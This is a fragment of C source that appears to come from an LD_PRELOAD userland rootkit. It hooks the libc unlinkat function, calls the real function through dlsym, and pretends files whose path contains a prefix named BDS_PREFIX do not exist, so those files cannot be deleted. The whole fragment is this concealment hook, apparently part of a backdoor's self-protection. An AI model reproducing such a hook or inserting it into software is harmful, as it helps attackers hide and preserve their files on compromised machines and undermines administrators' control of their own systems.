int unlinkat(int dirfd, const char *pathname, int flags) {
	if (!orig_unlinkat)
		orig_unlinkat = dlsym(RTLD_NEXT,"unlinkat");
	if (debug == 1)
		printf("\nunlinkat  : %s\n", pathname);
	if (strstr(pathname, BDS_PREFIX)) {
		errno = ENOENT;
		return -1;
	}
    
	return orig_unlinkat(dirfd, pathname, flags);
}